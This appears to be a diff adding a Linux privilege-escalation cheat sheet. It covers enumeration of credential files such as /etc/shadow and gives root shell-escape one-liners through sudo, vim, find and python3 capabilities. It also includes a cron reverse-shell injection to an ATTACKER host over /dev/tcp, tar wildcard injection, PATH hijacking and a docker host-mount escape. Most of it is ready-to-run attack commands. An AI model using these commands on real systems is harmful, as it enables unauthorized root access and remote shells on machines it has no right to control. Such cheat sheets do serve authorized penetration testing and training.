@@ -1,0 +1,78 @@
+LINUX PRIVILEGE ESCALATION CHEATSHEET
+======================================
+
+ENUMERATION
+  whoami && id                  Current user/groups
+  uname -a                     Kernel version
+  cat /etc/os-release           OS info
+  cat /etc/passwd               User list
+  cat /etc/shadow               Password hashes (if readable)
+  cat /etc/sudoers              Sudo config
+  sudo -l                      What can I sudo?
+  find / -perm -4000 2>/dev/null   SUID binaries
+  find / -perm -2000 2>/dev/null   SGID binaries
+  find / -writable 2>/dev/null     Writable files
+  getcap -r / 2>/dev/null          Capabilities
+  crontab -l && ls /etc/cron*      Cron jobs
+  ps aux                          Running processes
+  netstat -tulnp                   Open ports
+  env                             Environment variables
+  cat /etc/fstab                  Mounted filesystems
+  ls -la /tmp /var/tmp /dev/shm   World-writable dirs
+
+SUID EXPLOITATION
+  find / -perm -4000 -type f 2>/dev/null
+  # Check on https://gtfobins.github.io/
+
+SUDO EXPLOITATION
+  sudo -l
+  # (ALL) NOPASSWD: /usr/bin/vim
+  sudo vim -c '!sh'
+  # (ALL) NOPASSWD: /usr/bin/find
+  sudo find / -exec /bin/sh \;
+  # (ALL) NOPASSWD: /usr/bin/python3
+  sudo python3 -c 'import os; os.system("/bin/sh")'
+
+KERNEL EXPLOITS
+  uname -r                        Get kernel version
+  searchsploit linux kernel       Search exploits
+  # DirtyPipe (CVE-2022-0847): kernel 5.8+
+  # DirtyCow (CVE-2016-5195): kernel 2.6.22-4.8.3
+  # PwnKit (CVE-2021-4034): polkit pkexec
+
+CAPABILITIES
+  getcap -r / 2>/dev/null
+  # python3 = cap_setuid+ep
+  python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+CRON JOBS
+  cat /etc/crontab
+  ls -la /etc/cron.d/
+  # If script is writable: inject reverse shell
+  echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /path/to/cron_script.sh
+
+PATH HIJACKING
+  echo $PATH
+  # If writable dir is in PATH before system dirs:
+  echo '/bin/bash' > /tmp/service_name
+  chmod +x /tmp/service_name
+  # Wait for cron/service to execute it
+
+WILDCARD INJECTION
+  # If cron runs: tar czf /tmp/backup.tar.gz *
+  echo '' > '--checkpoint=1'
+  echo '' > '--checkpoint-action=exec=sh shell.sh'
+
+NFS
+  showmount -e target
+  # no_root_squash? Mount and create SUID binary
+
+DOCKER ESCAPE
+  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+  # If in docker group: full host access
+
+TOOLS
+  linpeas.sh        https://github.com/peass-ng/PEASS-ng
+  LinEnum.sh        https://github.com/rebootuser/LinEnum
+  pspy              https://github.com/DominicBreuker/pspy
+  GTFOBins          https://gtfobins.github.io/
